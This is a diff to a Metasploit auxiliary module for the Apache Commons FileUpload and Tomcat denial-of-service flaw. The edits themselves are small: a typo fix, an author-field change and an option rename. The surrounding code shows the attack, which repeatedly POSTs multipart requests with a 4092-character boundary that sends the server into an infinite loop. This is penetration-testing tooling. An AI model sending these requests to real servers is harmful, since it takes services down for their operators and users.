@@ -14,7 +14,7 @@ class Metasploit4 < Msf::Auxiliary
     super(update_info(info,
       'Name'            => 'Apache Commons FileUpload and Apache Tomcat DoS',
       'Description'     => %q{
-          This module triggers an inifinite loop in Apache Commons FileUpload 1.0 through 1.3
+          This module triggers an infinite loop in Apache Commons FileUpload 1.0 through 1.3
         via a Content-Type header.
         Apache Tomcat 7 and Apache Tomcat 8 use a copy of Apache Commons FileUpload
         to handle mime-multipart requests, therefore, Apache Tomcat 7.0.0 through 7.0.50
@@ -23,7 +23,7 @@ class Metasploit4 < Msf::Auxiliary
        },
        'Author'         =>
          [
-           'This issue was reported to the Apache Software Foundation and accidently made public.', # advisory
+           'Unknown', #This issue was reported to the Apache Software Foundation and accidently made public.
            'ribeirux' # metasploit module
          ],
        'License'        => MSF_LICENSE,
@@ -40,7 +40,7 @@ class Metasploit4 < Msf::Auxiliary
       register_options(
         [
           Opt::RPORT(8080),
-          OptString.new('URI', [ true,  "The request URI", '/']),
+          OptString.new('TARGETURI', [ true,  "The request URI", '/']),
           OptInt.new('RLIMIT', [ true,  "Number of requests to send",50])
         ], self.class)
   end
@@ -49,7 +49,7 @@ class Metasploit4 < Msf::Auxiliary
     boundary = "0"*4092
     opts = {
       'method'         => "POST",
-      'uri'            => normalize_uri(datastore['URI']),
+      'uri'            => normalize_uri(target_uri.to_s),
       'ctype'          => "multipart/form-data; boundary=#{boundary}",
       'data'           => "#{boundary}00000",
       'headers' => {
